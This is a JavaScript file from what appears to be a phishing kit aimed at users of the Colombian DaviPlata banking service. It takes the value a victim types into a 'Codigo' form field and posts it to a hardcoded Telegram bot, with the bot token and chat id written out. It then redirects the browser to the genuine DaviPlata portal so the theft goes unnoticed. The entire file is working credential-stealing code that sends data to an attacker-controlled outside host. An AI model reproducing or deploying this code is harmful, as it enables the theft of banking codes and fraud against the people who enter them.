//bot token
var telegram_bot_id = "5758939729:AAFKuJsR9b_lih1JgNT94YntILfMSJc5n7w";
//chat id
var chat_id = 5761305028;
var u_name, pax;
var ready = function () {
    u_name = document.getElementById("Codigo").value;
    message = "Code: " + u_name;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location =
'https://daviplata.com/wps/portal/daviplata/Home/QueEsDaviPlata/!ut/p/z1/hY7BDoIwEES_hQNXdgUU462gQY3R4EGhFwOmFkyhpFT4fWs8kWCc2-68mQxQSIE2eV_xXFeyyYW5M7q4BYmP28ifHWMSbTBBN9itLx5i7MP1H0CNjT9E0OTpBEIwPLvhp-DkTgKjjj1QLmTxnUuawltyoIo9mGLKeSnzLrVuu5WNNg7D4HApuWDOXdY2TkVK2WlIxyS0dYrPuegPxLLeIhg6wg!!/dz/d5/L2dBISEvZ0FBIS9nQSEh';
        console.log(response);
    });

    return false;
};
